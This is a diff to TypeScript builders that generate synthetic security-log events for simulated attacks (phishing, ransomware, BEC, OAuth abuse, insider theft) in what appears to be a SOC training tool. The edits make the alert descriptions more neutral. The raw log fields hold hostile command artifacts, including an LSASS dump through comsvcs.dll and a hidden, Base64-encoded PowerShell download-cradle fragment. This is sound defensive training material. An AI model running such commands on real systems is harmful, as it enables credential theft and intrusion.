@@ -269,7 +269,7 @@ export function buildPhishingToExfil(scenarioId = "phish-exfil-2026"): ScenarioB
       source: "ad", vendor: "Windows Security", event_type: "auth_success",
       hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
       severity: "informational",
-      description: "j.smith logged on to WS-FIN-2847 from the office network — normal working hours, known IP.",
+      description: "j.smith logged on to WS-FIN-2847 from the office network during working hours.",
       raw: {
         // Windows Security Event 4624 — Successful Logon
         "winlog.event_id": "4624",
@@ -430,7 +430,7 @@ export function buildPhishingToExfil(scenarioId = "phish-exfil-2026"): ScenarioB
       src_ip: victim.ip, dst_ip: "10.10.1.20", dst_port: 445, protocol: "tcp",
       severity: "high", mitre_technique: "T1021.002",
       network: { bytes_out: 84992, bytes_in: 12288 },
-      description: `WS-FIN-2847 opened an SMB connection to internal file server 10.10.1.20 using the credentials just dumped from LSASS — workstations do not normally initiate SMB to this server.`,
+      description: `WS-FIN-2847 opened an SMB session to internal file server 10.10.1.20 on port 445, allowed by rule ALLOW-INTERNAL.`,
       raw: {
         "event.action": "network-connection-allowed", "event.outcome": "success",
         "source.ip": victim.ip, "source.port": "49851",
@@ -450,7 +450,7 @@ export function buildPhishingToExfil(scenarioId = "phish-exfil-2026"): ScenarioB
       hostname: victim.hostname, user_email: victim.email,
       severity: "high", mitre_technique: "T1027",
       file: { path: "C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost32.dll", sha256: dllHash, size: 143360 },
-      description: "powershell.exe wrote an unsigned DLL named svchost32.dll to the user's Temp folder on WS-FIN-2847 — never seen before globally.",
+      description: "powershell.exe wrote an unsigned DLL named svchost32.dll to jsmith's Temp folder on WS-FIN-2847.",
       raw: {
         // CrowdStrike Falcon — detection metadata
         "crowdstrike.event_simplename": "NewExecutableWritten",
@@ -521,7 +521,7 @@ export function buildPhishingToExfil(scenarioId = "phish-exfil-2026"): ScenarioB
       source: "sysmon", vendor: "Microsoft Sysmon", event_type: "registry_set",
       hostname: victim.hostname, user_email: victim.email,
       severity: "high", mitre_technique: "T1547.001",
-      description: "PowerShell created an HKCU Run key named WindowsUpdater on WS-FIN-2847 pointing to the dropped DLL — it will now launch automatically at every logon.",
+      description: "PowerShell set an HKCU Run value named WindowsUpdater on WS-FIN-2847 that launches rundll32.exe against svchost32.dll.",
       raw: {
         "event.code": "13",
         "winlog.provider_name": "Microsoft-Windows-Sysmon",
@@ -542,7 +542,7 @@ export function buildPhishingToExfil(scenarioId = "phish-exfil-2026"): ScenarioB
       hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
       severity: "high", mitre_technique: "T1071.004",
       network: { domain: c2Domain },
-      description: `WS-FIN-2847 sent 48 DNS TXT queries to ${c2Domain} in 10 minutes using long, random-looking subdomains — consistent with data being tunneled out over DNS.`,
+      description: `WS-FIN-2847 sent a DNS TXT query for a long random subdomain of ${c2Domain} and received a Base64-encoded answer.`,
       raw: {
         "event.action": "dns_query",
         "infoblox.query_name": "dh7k2nq3x1vc9ab4fzrp.c2-cdn-update-fb76.xyz",
@@ -596,7 +596,7 @@ export function buildPhishingToExfil(scenarioId = "phish-exfil-2026"): ScenarioB
         user: "CRYOTECH\\jsmith", integrity: "high",
       },
       file: { path: "C:\\Users\\jsmith\\AppData\\Local\\Temp\\debug.bin" },
-      description: "CrowdStrike detected rundll32.exe on WS-FIN-2847 using comsvcs.dll to dump lsass.exe memory to debug.bin — the file now contains cached credentials and Kerberos tickets.",
+      description: "CrowdStrike detected rundll32.exe on WS-FIN-2847 using comsvcs.dll MiniDump to write lsass.exe memory to debug.bin.",
       raw: {
         // CrowdStrike Falcon — detection metadata
         "crowdstrike.event_simplename": "CredentialDumpingTool",
@@ -686,7 +686,7 @@ export function buildPhishingToExfil(scenarioId = "phish-exfil-2026"): ScenarioB
       // cracked offline — a different event id, a different direction, and it
       // requires a valid account to begin with.
       severity: "high", mitre_technique: "T1550.002",
-      description: `A Kerberos TGT for jsmith was requested from WS-FIN-2847 using RC4 encryption minutes after the LSASS dump. The account's earlier sign-ins that day used AES256.`,
+      description: `A Kerberos TGT for jsmith was requested from WS-FIN-2847 using RC4 encryption (0x17).`,
       raw: {
         "event.code": "4768",
         "winlog.channel": "Security",
@@ -709,7 +709,7 @@ export function buildPhishingToExfil(scenarioId = "phish-exfil-2026"): ScenarioB
       source: "ad", vendor: "Windows Security", event_type: "auth_success",
       hostname: "FS-CORP-01", user_email: victim.email,
       severity: "high", mitre_technique: "T1078",
-      description: "jsmith authenticated to FS-CORP-01 via a network logon (Type 3) using the credentials taken from LSASS — j.smith was not physically at that server.",
+      description: "jsmith authenticated to FS-CORP-01 via a Kerberos network logon (Type 3) sourced from WS-FIN-2847.",
       raw: {
         "event.code": "4624",
         "winlog.channel": "Security",
@@ -732,7 +732,7 @@ export function buildPhishingToExfil(scenarioId = "phish-exfil-2026"): ScenarioB
       source: "o365", vendor: "Microsoft Entra ID", event_type: "auth_success",
       user_email: victim.email, src_ip: attackerIp,
       severity: "critical", mitre_technique: "T1078",
-      description: `j.smith's Microsoft 365 account signed in from Amsterdam, Netherlands (${attackerIp}) — a country this account has never used before. Entra ID Identity Protection flagged the sign-in as High Risk.`,
+      description: `j.smith's Microsoft 365 account signed in from Amsterdam, Netherlands (${attackerIp}); Entra ID Identity Protection rated the sign-in High Risk.`,
       raw: {
         // Azure AD / Entra ID Sign-In Log
         "azure.signinlogs.correlation_id": "c3d4e5f6-a1b2-c3d4-e5f6-a1b2c3d4e5f6",
@@ -825,7 +825,7 @@ export function buildPhishingToExfil(scenarioId = "phish-exfil-2026"): ScenarioB
       user_email: victim.email, src_ip: attackerIp,
       severity: "critical", mitre_technique: "T1567.002",
       network: { bytes_out: 184_000_000 },
-      description: `j.smith's AWS credentials were used to download a 184MB customer financial archive from S3 — 650x this account's normal daily volume, from the same Netherlands IP as the earlier sign-in.`,
+      description: `j.smith's AWS credentials downloaded a 184MB customer financial archive from S3 from ${attackerIp} (Netherlands).`,
       raw: {
         "event.action": "GetObject", "event.outcome": "success",
         "aws.cloudtrail.event_name": "GetObject",
@@ -848,7 +848,7 @@ export function buildPhishingToExfil(scenarioId = "phish-exfil-2026"): ScenarioB
       event_type: "auth_success", severity: "informational",
       user_email: victim.email,
       src_ip: "185.64.44.22",
-      description: "j.smith logged in to Okta from Tel Aviv on a registered device — routine morning login.",
+      description: "j.smith logged in to Okta from Tel Aviv on a registered device.",
       raw: {
         "okta.event_type": "user.session.start",
         "okta.outcome.result": "SUCCESS",
@@ -875,7 +875,7 @@ export function buildPhishingToExfil(scenarioId = "phish-exfil-2026"): ScenarioB
       event_type: "dns_query", severity: "high",
       hostname: victim.hostname, src_ip: victim.ip,
       mitre_technique: "T1071.001",
-      description: `WS-FIN-2847 resolved ${c2Domain} for the first time ever — the domain was registered only 3 days ago.`,
+      description: `WS-FIN-2847 resolved ${c2Domain}, a domain registered 3 days ago.`,
       raw: {
         "event.code": "22",
         "winlog.provider_name": "Microsoft-Windows-Sysmon",
@@ -922,7 +922,7 @@ export function buildPhishingToExfil(scenarioId = "phish-exfil-2026"): ScenarioB
       source: "ad", vendor: "Microsoft Entra ID",
       event_type: "account_modify", severity: "medium",
       user_email: victim.email, src_ip: "10.10.1.5",
-      description: "Entra ID Identity Protection automatically set j.smith's account risk to High after the Netherlands sign-in.",
+      description: "Entra ID Identity Protection raised j.smith's account risk level to High.",
       raw: {
         "data.office365.Operation": "Set user risk level",
         "data.office365.Workload": "AzureActiveDirectory",
@@ -1162,7 +1162,7 @@ export function buildBecScenario(scenarioId = "bec-spray-2026"): ScenarioBundle 
       source: "o365", vendor: "Microsoft Entra ID", event_type: "mfa_challenge",
       user_email: victim.email, src_ip: attackerIp,
       severity: "critical", mitre_technique: "T1078",
-      description: `l.harris approved an MFA push at 02:12 local time from Amsterdam, Netherlands (${attackerIp}) — a country this account has never signed in from before.`,
+      description: `l.harris approved an MFA push at 02:12 local time from Amsterdam, Netherlands (${attackerIp}).`,
       raw: {
         // Azure AD / Entra ID Sign-In Log — MFA fatigue victim accepted push
         "azure.signinlogs.correlation_id": "e5f6a1b2-c3d4-e5f6-a1b2-c3d4e5f6a1b2",
@@ -1247,7 +1247,7 @@ export function buildBecScenario(scenarioId = "bec-spray-2026"): ScenarioBundle 
       source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "cloud_api_call",
       user_email: victim.email, src_ip: attackerIp,
       severity: "high", mitre_technique: "T1114.002",
-      description: `340 emails were accessed in l.harris's mailbox within 2 minutes via Outlook Web App from ${attackerIp} — far faster than a human reads email.`,
+      description: `340 emails were accessed in l.harris's mailbox within 2 minutes via Outlook Web App from ${attackerIp}.`,
       raw: {
         // O365 Unified Audit Log — MailItemsAccessed (ExchangeItemAggregated)
         "data.office365.Id": "c3d4e5f6-a1b2-c3d4-e5f6-a1b2c3d4e5f6",
@@ -1757,7 +1757,7 @@ export function buildRansomwareScenario(scenarioId = "ransomware-lockbit-2026"):
         user: "CRYOTECH\\cmartin", integrity: "high",
       },
       file: { path: "C:\\Windows\\Temp\\mem.dmp" },
-      description: "CrowdStrike detected rundll32.exe on WS-FIN-1193 using comsvcs.dll to dump lsass.exe memory to mem.dmp — a domain admin had an active session on this workstation.",
+      description: "CrowdStrike detected rundll32.exe on WS-FIN-1193 using comsvcs.dll to dump lsass.exe memory to mem.dmp.",
       raw: {
         // CrowdStrike Falcon — detection metadata
         "crowdstrike.event_simplename": "CredentialDumpingTool",
@@ -1846,7 +1846,7 @@ export function buildRansomwareScenario(scenarioId = "ransomware-lockbit-2026"):
       hostname: zero.hostname, user_email: zero.email,
       src_ip: zero.ip, dst_ip: server.ip, dst_port: 445, protocol: "tcp",
       severity: "critical", mitre_technique: "T1021.002",
-      description: `WS-FIN-1193 (${zero.ip}) opened an SMB connection to the ADMIN$ share on FS-CORP-01 (${server.ip}) using da-backup's NTLM hash, without ever presenting a plaintext password.`,
+      description: `WS-FIN-1193 (${zero.ip}) opened an SMB connection to the ADMIN$ share on FS-CORP-01 (${server.ip}), authenticated with NTLM.`,
       raw: {
         "event.action": "network-connection",
         "source.ip": "10.10.20.33", "source.hostname": "WS-FIN-1193",
@@ -1948,7 +1948,7 @@ export function buildRansomwareScenario(scenarioId = "ransomware-lockbit-2026"):
       source: "ad", vendor: "Windows Security", event_type: "audit_log_cleared",
       hostname: "FS-CORP-01", user_email: "svc-backup@cryotech.com",
       severity: "high", mitre_technique: "T1070.001",
-      description: "Windows recorded Event 1102 on FS-CORP-01 — the Security audit log was cleared, the one entry wevtutil could not erase because it was already written.",
+      description: "Windows recorded Event 1102 on FS-CORP-01 — the Security audit log was cleared.",
       raw: {
         "event.code": "1102",
         "winlog.channel": "Security",
@@ -2019,7 +2019,7 @@ export function buildRansomwareScenario(scenarioId = "ransomware-lockbit-2026"):
       source: "edr", vendor: "CrowdStrike Falcon",
       event_type: "file_access", severity: "informational",
       hostname: zero.hostname, user_email: zero.email,
-      description: "c.martin opened Budget_Q2_2026.xlsx from the Finance share on FS-CORP-01 — the last routine file access before the intrusion.",
+      description: "c.martin opened Budget_Q2_2026.xlsx from the Finance share on FS-CORP-01.",
       raw: {
         "event.action": "FileAccessed",
         "file.path": "\\\\FS-CORP-01\\Finance\\Budget_Q2_2026.xlsx",
@@ -2037,7 +2037,7 @@ export function buildRansomwareScenario(scenarioId = "ransomware-lockbit-2026"):
       source: "sysmon", vendor: "Microsoft Sysmon",
       event_type: "process_create", severity: "informational",
       hostname: server.hostname,
-      description: "vssadmin list shadows ran on FS-CORP-01 under PSEXESVC.exe, confirming 12 shadow copies present just before they were deleted.",
+      description: "vssadmin.exe ran list shadows on FS-CORP-01 under PSEXESVC.exe, returning 12 shadow copies.",
       raw: {
         "event.code": "1",
         "winlog.provider_name": "Microsoft-Windows-Sysmon",
@@ -2065,7 +2065,7 @@ export function buildRansomwareScenario(scenarioId = "ransomware-lockbit-2026"):
       mitre_technique: "T1071.001",
       src_ip: server.ip, dst_ip: c2Ip, dst_port: 443,
       hostname: server.hostname,
-      description: `FS-CORP-01 began beaconing to ${c2Ip} shortly after PSEXESVC.exe landed — the same C2 IP the workstation had contacted.`,
+      description: `FS-CORP-01 began sending outbound HTTPS traffic to ${c2Ip} at regular intervals.`,
       raw: {
         "event.action": "allow",
         "source.ip": server.ip,
@@ -2213,7 +2213,7 @@ export function buildOAuthScenario(scenarioId = "oauth-persistence-2026"): Scena
       source: "ad", vendor: "Microsoft Entra ID", event_type: "auth_failure",
       src_ip: sprayIp,
       severity: "high", mitre_technique: "T1110.003",
-      description: `43 failed Microsoft 365 login attempts hit 12 accounts, including s.chen, from the same German IP (${sprayIp}) within 6 minutes — below the lockout threshold.`,
+      description: `43 failed Microsoft 365 login attempts hit 12 accounts, including s.chen, from the same German IP (${sprayIp}) within 6 minutes.`,
       raw: {
         // Entra ID sign-in failure aggregate — password spray from Germany
         "azure.signinlogs.correlation_id": "a1b2c3d4-e5f6-a1b2-c3d4-e5f6a1b2c3d4",
@@ -2268,7 +2268,7 @@ export function buildOAuthScenario(scenarioId = "oauth-persistence-2026"): Scena
       source: "o365", vendor: "Microsoft Entra ID", event_type: "mfa_challenge",
       user_email: victim.email, src_ip: sprayIp,
       severity: "critical", mitre_technique: "T1078",
-      description: `s.chen's password was guessed during the spray, and the sign-in from Germany (${sprayIp}) at 02:40 completed after s.chen approved the MFA push — a country this account has never used before.`,
+      description: `s.chen signed in successfully from Germany (${sprayIp}) at 02:40 after approving an MFA push.`,
       raw: {
         // Azure AD / Entra ID Sign-In Log — MFA fatigue victim accepted push (s.chen, Germany)
         "azure.signinlogs.correlation_id": "b2c3d4e5-f6a1-b2c3-d4e5-f6a1b2c3d4e5",
@@ -2397,7 +2397,7 @@ export function buildOAuthScenario(scenarioId = "oauth-persistence-2026"): Scena
       source: "o365", vendor: "Microsoft Graph Security API", event_type: "cloud_api_call",
       user_email: victim.email, src_ip: sessionIp,
       severity: "high", mitre_technique: "T1114.002",
-      description: `The MicrosoftSecurityUpdate app read 187 emails from s.chen's inbox via Graph API using an OAuth access token, from ${sessionIp} — no password or interactive sign-in involved.`,
+      description: `The MicrosoftSecurityUpdate app read 187 emails from s.chen's inbox via Graph API using an OAuth access token, from ${sessionIp}.`,
       raw: {
         "event.action": "MailItemsAccessed", "event.outcome": "success",
         "user.email": "s.chen@cryotech.com",
@@ -2412,7 +2412,7 @@ export function buildOAuthScenario(scenarioId = "oauth-persistence-2026"): Scena
       source: "ad", vendor: "Microsoft Entra ID", event_type: "account_modify",
       user_email: victim.email, src_ip: "10.10.1.5",
       severity: "medium",
-      description: "IT helpdesk reset s.chen's password (ticket INC-4821) after a suspicious sign-in report. The MicrosoftSecurityUpdate app consent was not reviewed or revoked.",
+      description: "IT helpdesk reset s.chen's password (ticket INC-4821) after a suspicious sign-in report.",
       raw: {
         // O365 UAL + Entra ID Audit Log — Reset user password (helpdesk action)
         "data.office365.Id": "f6a1b2c3-d4e5-f6a1-b2c3-d4e5f6a1b2c4",
@@ -2446,7 +2446,7 @@ export function buildOAuthScenario(scenarioId = "oauth-persistence-2026"): Scena
       source: "o365", vendor: "Microsoft Graph Security API", event_type: "cloud_api_call",
       user_email: victim.email, src_ip: sessionIp,
       severity: "high", mitre_technique: "T1114.002",
-      description: "The MicrosoftSecurityUpdate app read 143 more emails from s.chen's inbox 2.5 hours after the password reset, using the same OAuth token issued at initial consent.",
+      description: "The MicrosoftSecurityUpdate app read 143 more emails from s.chen's inbox via Graph API, 2.5 hours after the password reset.",
       raw: {
         "event.action": "MailItemsAccessed", "event.outcome": "success",
         "user.email": "s.chen@cryotech.com",
@@ -2461,7 +2461,7 @@ export function buildOAuthScenario(scenarioId = "oauth-persistence-2026"): Scena
       source: "o365", vendor: "Microsoft Graph Security API", event_type: "cloud_api_call",
       user_email: victim.email, src_ip: sessionIp,
       severity: "critical", mitre_technique: "T1530",
-      description: "The app downloaded RoadmapQ4-Confidential.pptx (27MB) from the ProductEngineering SharePoint site via Graph API — SharePoint DLP does not inspect Graph API traffic.",
+      description: "The app downloaded RoadmapQ4-Confidential.pptx (27MB) from the ProductEngineering SharePoint site via Graph API.",
       network: { bytes_out: 27_100_000 },
       raw: {
         "event.action": "FileDownloaded", "event.outcome": "success",
@@ -2496,7 +2496,7 @@ export function buildOAuthScenario(scenarioId = "oauth-persistence-2026"): Scena
       source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "ueba_anomaly",
       user_email: victim.email,
       severity: "high",
-      description: "Microsoft 365 Security flagged MicrosoftSecurityUpdate as still active 16 hours after compromise and 9 hours after the password reset, having accessed 330 emails and 89 files.",
+      description: "Microsoft 365 Security reported the MicrosoftSecurityUpdate app as still active, with 330 emails and 89 files accessed to date.",
       raw: {
         "event.action": "OAuth_AnomalyDetected",
         "application.id": appId, "application.name": "MicrosoftSecurityUpdate",
@@ -2540,7 +2540,7 @@ export function buildOAuthScenario(scenarioId = "oauth-persistence-2026"): Scena
       event_type: "email_received", severity: "high",
       user_email: victim.email, src_ip: "91.108.56.207",
       mitre_technique: "T1566.002",
-      description: "s.chen received an email posing as a Microsoft security alert containing an OAuth consent link — delivered despite O365 Safe Links.",
+      description: "s.chen received an email posing as a Microsoft security alert and containing an OAuth consent link.",
       raw: {
         "event.action": "EmailDelivered", "event.outcome": "success",
         "email.from.address": "security-alert@microsoftupdate-secure.xyz",
@@ -2563,7 +2563,7 @@ export function buildOAuthScenario(scenarioId = "oauth-persistence-2026"): Scena
       event_type: "cloud_api_call", severity: "high",
       user_email: victim.email, src_ip: sprayIp,
       mitre_technique: "T1114.002",
-      description: "The MicrosoftSecurityUpdate app logged into s.chen's mailbox via Graph API exactly 1 minute after consent was granted.",
+      description: "The MicrosoftSecurityUpdate app signed in to s.chen's mailbox via Graph API one minute after consent was granted.",
       raw: {
         "event.action": "MailboxLogin",
         "event.outcome": "success",
@@ -2673,7 +2673,7 @@ export function buildInsiderThreatScenario(scenarioId = "insider-threat-2026"): 
       source: "ad", vendor: "Windows Security", event_type: "auth_success",
       hostname: insider.hostname, user_email: insider.email, src_ip: insider.ip,
       severity: "informational",
-      description: "m.torres logged on to WS-FIN-4421 at 13:00 — a Finance Analyst with an HR termination flag effective tomorrow, not yet communicated to IT Security.",
+      description: "m.torres, a Finance Analyst, logged on to WS-FIN-4421 at 13:00; HR records carry a termination flag effective the next day.",
       raw: {
         // Windows Security Event 4624 — Successful Logon (pre-termination day)
         "winlog.event_id": "4624",
@@ -2731,7 +2731,7 @@ export function buildInsiderThreatScenario(scenarioId = "insider-threat-2026"): 
       source: "o365", vendor: "Microsoft Purview", event_type: "cloud_api_call",
       user_email: insider.email, src_ip: insider.ip,
       severity: "medium", mitre_technique: "T1530",
-      description: "m.torres downloaded 12 files from the Finance SharePoint site in 3 minutes — about 4x their normal daily rate.",
+      description: "m.torres downloaded 12 files from the Finance SharePoint site in 3 minutes.",
       raw: {
         "event.action": "FileDownloaded", "event.outcome": "success",
         "user.email": "m.torres@cryotech.com",
@@ -2746,7 +2746,7 @@ export function buildInsiderThreatScenario(scenarioId = "insider-threat-2026"): 
       source: "o365", vendor: "Microsoft Purview", event_type: "dlp_alert",
       user_email: insider.email, src_ip: insider.ip,
       severity: "high", mitre_technique: "T1530",
-      description: "Microsoft Purview DLP fired Finance-PII-Bulk-Download after m.torres downloaded 47 sensitive Finance files (18.2MB) in 15 minutes — the policy only notifies, it does not block.",
+      description: "Microsoft Purview DLP fired Finance-PII-Bulk-Download after m.torres downloaded 47 sensitive Finance files (18.2MB) in 15 minutes; policy action was notify-only.",
       raw: {
         "event.action": "DLP_PolicyTriggered", "event.outcome": "success",
         "user.email": "m.torres@cryotech.com",
@@ -2853,7 +2853,7 @@ export function buildInsiderThreatScenario(scenarioId = "insider-threat-2026"): 
       source: "o365", vendor: "Microsoft Purview", event_type: "cloud_api_call",
       user_email: insider.email, src_ip: insider.ip,
       severity: "medium",
-      description: "m.torres, a Finance Analyst, accessed Restricted HR documents (compensation bands, layoff planning) on the HR SharePoint site — a cross-site permission that should not exist for this role.",
+      description: "m.torres, a Finance Analyst, accessed Restricted HR documents (compensation bands, layoff planning) on the HR SharePoint site.",
       raw: {
         "event.action": "FileAccessed", "event.outcome": "success",
         "user.email": "m.torres@cryotech.com",
@@ -2885,7 +2885,7 @@ export function buildInsiderThreatScenario(scenarioId = "insider-threat-2026"): 
       source: "ad", vendor: "Windows Security", event_type: "auth_success",
       hostname: insider.hostname, user_email: insider.email, src_ip: insider.ip,
       severity: "informational",
-      description: "m.torres logged off WS-FIN-4421 at 16:00, 2 minutes after the USB drive was physically removed.",
+      description: "m.torres logged off WS-FIN-4421 at 16:00, two minutes after the USB drive was removed.",
       raw: {
         "event.code": "4634", "event.action": "logged-off", "event.outcome": "success",
         "logon.type": "0",
@@ -2902,7 +2902,7 @@ export function buildInsiderThreatScenario(scenarioId = "insider-threat-2026"): 
       source: "o365", vendor: "Microsoft Purview",
       event_type: "cloud_api_call", severity: "informational",
       user_email: insider.email, src_ip: insider.ip,
-      description: "m.torres accessed 11 Finance files over a full 8-hour day the day before — the normal baseline.",
+      description: "m.torres accessed 11 Finance files over a full 8-hour day the day before.",
       raw: {
         "event.action": "FileAccessed",
         "user.email": insider.email,
@@ -3238,7 +3238,7 @@ export function buildImpossibleTravelScenario(scenarioId = "impossible-travel-20
       src_ip: nigIp,
       geo: { country: "Nigeria", city: "Lagos", latitude: 6.5244, longitude: 3.3792 },
       mitre_technique: "T1078",
-      description: "k.taylor's account connected to the VPN from Lagos, Nigeria, on an unregistered device, 4 minutes after the Tel Aviv login — 7,223km away.",
+      description: "k.taylor's account connected to the VPN from Lagos, Nigeria, on an unregistered device.",
       raw: {
         "event.action":                    "vpn_connected",
         "event.outcome":                   "success",
@@ -3273,7 +3273,7 @@ export function buildImpossibleTravelScenario(scenarioId = "impossible-travel-20
       src_ip: nigIp,
       geo: { country: "Nigeria", city: "Lagos", latitude: 6.5244, longitude: 3.3792 },
       mitre_technique: "T1078",
-      description: "k.taylor's account authenticated to Azure AD from the same Nigerian IP two minutes after the VPN connection.",
+      description: "k.taylor's account authenticated to Azure AD from a Nigerian IP address.",
       raw: {
         "data.office365.AzureActiveDirectoryEventType": "1",
         "data.office365.Operation":        "UserLoggedIn",
@@ -3343,7 +3343,7 @@ export function buildImpossibleTravelScenario(scenarioId = "impossible-travel-20
       user_email: user.email,
       src_ip: nigIp,
       mitre_technique: "T1530",
-      description: "847 files (2.3GB) were downloaded from the Engineering SharePoint site in 5 minutes from the same Nigerian IP — this account normally downloads about 12 files per day.",
+      description: "847 files (2.3GB) were downloaded from the Engineering SharePoint site in 5 minutes from a Nigerian IP.",
       raw: {
         "data.office365.Operation":        "FileDownloaded",
         "data.office365.Workload":         "SharePoint",
@@ -3483,7 +3483,7 @@ export function buildPhishingMalwareScenario(scenarioId = "phishing-malware-basi
       source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
       hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
       severity: "high", mitre_technique: "T1204.002",
-      description: "r.avraham extracted the ZIP and double-clicked Delivery_Notice_48213.pdf.exe on WS-HR-1182 — an executable disguised as a PDF using a hidden double extension. explorer.exe spawned the process directly, with no legitimate parent application.",
+      description: "r.avraham extracted the ZIP and ran Delivery_Notice_48213.pdf.exe from the Downloads folder on WS-HR-1182; explorer.exe was the parent process.",
       process: {
         name: "Delivery_Notice_48213.pdf.exe", pid: 6624, parent_name: "explorer.exe", parent_pid: 3140,
         cmdline: "\"C:\\Users\\r.avraham\\Downloads\\Delivery_Notice_48213.pdf.exe\"",
@@ -3526,7 +3526,7 @@ export function buildPhishingMalwareScenario(scenarioId = "phishing-malware-basi
       src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443, protocol: "tcp",
       severity: "high", mitre_technique: "T1071.001",
       network: { bytes_out: 4608, bytes_in: 51200, domain: c2Domain },
-      description: "Delivery_Notice_48213.pdf.exe on WS-HR-1182 opened an outbound HTTPS connection to shiptrack-updates-net.xyz, a domain registered 2 days ago — the firewall allowed it since the domain was not yet on any blocklist.",
+      description: "WS-HR-1182 opened an outbound HTTPS session to shiptrack-updates-net.xyz, a domain registered 2 days ago; the firewall allowed the session.",
       raw: {
         "event.action": "network-connection-allowed", "event.outcome": "success",
         "source.ip": victim.ip, "source.port": "51204",
@@ -3546,7 +3546,7 @@ export function buildPhishingMalwareScenario(scenarioId = "phishing-malware-basi
       hostname: victim.hostname, user_email: victim.email,
       severity: "critical", mitre_technique: "T1204.002",
       file: { path: "C:\\Users\\r.avraham\\Downloads\\Delivery_Notice_48213.pdf.exe", sha256: fileHash, size: 391168 },
-      description: "CrowdStrike Falcon identified Delivery_Notice_48213.pdf.exe as a known commodity trojan (family: Glupteba-variant) and quarantined it on WS-HR-1182 — but the process had already run for over 2 minutes and reached out to its command server before being caught.",
+      description: "CrowdStrike Falcon quarantined Delivery_Notice_48213.pdf.exe on WS-HR-1182, matching a known commodity trojan signature (family: Glupteba-variant).",
       raw: {
         "crowdstrike.event_simplename": "DetectionSummaryEvent",
         "crowdstrike.detection.id": "ldt:d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1:2234567891",
@@ -3647,7 +3647,7 @@ export function buildUsbMalwareScenario(scenarioId = "usb-malware-basic-2026"): 
       hostname: victim.hostname, user_email: victim.email,
       severity: "low",
       file: { path: "C:\\Users\\m.levi\\Desktop\\USB_Backup_Tool.exe", sha256: fileHash, size: 245760 },
-      description: "USB_Backup_Tool.exe was copied from a removable USB drive (E:\\) to the Desktop on WS-OPS-2214 — the drive has no company asset tag and was not previously seen on this host.",
+      description: "USB_Backup_Tool.exe was copied from a removable USB drive (E:\\) to the Desktop on WS-OPS-2214.",
       raw: {
         "crowdstrike.event_simplename": "NewExecutableWritten",
         "event.action": "file_written",
@@ -3667,7 +3667,7 @@ export function buildUsbMalwareScenario(scenarioId = "usb-malware-basic-2026"): 
       source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
       hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
       severity: "high", mitre_technique: "T1204.002",
-      description: "m.levi double-clicked USB_Backup_Tool.exe on WS-OPS-2214. explorer.exe spawned the process directly — the binary is unsigned and had never been seen anywhere in this environment before.",
+      description: "m.levi ran USB_Backup_Tool.exe on WS-OPS-2214 with explorer.exe as the parent process; the binary is unsigned.",
       process: {
         name: "USB_Backup_Tool.exe", pid: 7712, parent_name: "explorer.exe", parent_pid: 3140,
         cmdline: "\"C:\\Users\\m.levi\\Desktop\\USB_Backup_Tool.exe\"",
@@ -3702,7 +3702,7 @@ export function buildUsbMalwareScenario(scenarioId = "usb-malware-basic-2026"): 
       source: "edr", vendor: "CrowdStrike Falcon", event_type: "registry_set",
       hostname: victim.hostname, user_email: victim.email,
       severity: "high", mitre_technique: "T1547.001",
-      description: "USB_Backup_Tool.exe wrote a Registry Run key on WS-OPS-2214 so it relaunches itself every time m.levi logs in — the malware is now persistent, even if the original USB drive is removed.",
+      description: "USB_Backup_Tool.exe wrote a Registry Run key on WS-OPS-2214 that relaunches it at every m.levi logon.",
       raw: {
         "crowdstrike.event_simplename": "RegistryOperationDetectInfo",
         "crowdstrike.detection.description": "Registry Run key created pointing to a binary that was executed directly from removable media minutes earlier. Consistent with autostart persistence.",
@@ -3725,7 +3725,7 @@ export function buildUsbMalwareScenario(scenarioId = "usb-malware-basic-2026"): 
       hostname: victim.hostname, user_email: victim.email,
       severity: "critical", mitre_technique: "T1547.001",
       file: { path: "C:\\Users\\m.levi\\Desktop\\USB_Backup_Tool.exe", sha256: fileHash, size: 245760 },
-      description: "CrowdStrike Falcon identified USB_Backup_Tool.exe as a known trojan dropper and quarantined the file and removed its Registry Run key on WS-OPS-2214 — but the malware had already achieved persistence before being caught.",
+      description: "CrowdStrike Falcon quarantined USB_Backup_Tool.exe on WS-OPS-2214 as a known trojan dropper and removed its Registry Run key.",
       raw: {
         "crowdstrike.event_simplename": "DetectionSummaryEvent",
         "crowdstrike.detection.description": "Known trojan-dropper signature match — file quarantined, malicious process killed, persistence artifact removed.",
@@ -3820,7 +3820,7 @@ export function buildBrowserExtensionMalwareScenario(scenarioId = "browser-exten
       source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
       hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
       severity: "low", mitre_technique: "T1176",
-      description: "Chrome relaunched on WS-MKT-3301 with a --load-extension command-line flag pointing to an unpacked folder in d.cohen's Downloads directory — a developer-mode flag that normal Chrome Web Store installs never use.",
+      description: "Chrome relaunched on WS-MKT-3301 with a --load-extension flag pointing to an unpacked folder in d.cohen's Downloads directory.",
       process: {
         name: "chrome.exe", pid: 8814, parent_name: "explorer.exe", parent_pid: 3140,
         cmdline: "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --load-extension=\"C:\\Users\\d.cohen\\Downloads\\perf_boost_ext_unpacked\"",
@@ -3856,7 +3856,7 @@ export function buildBrowserExtensionMalwareScenario(scenarioId = "browser-exten
       source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
       hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
       severity: "high", mitre_technique: "T1059.001",
-      description: "chrome.exe on WS-MKT-3301 spawned powershell.exe directly, with a hidden window and a Base64-encoded command — a browser process is never the parent of a scripting interpreter in normal operation.",
+      description: "chrome.exe on WS-MKT-3301 spawned powershell.exe directly, with a hidden window and a Base64-encoded command.",
       process: {
         name: "powershell.exe", pid: 9021, parent_name: "chrome.exe", parent_pid: 8814,
         cmdline: "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
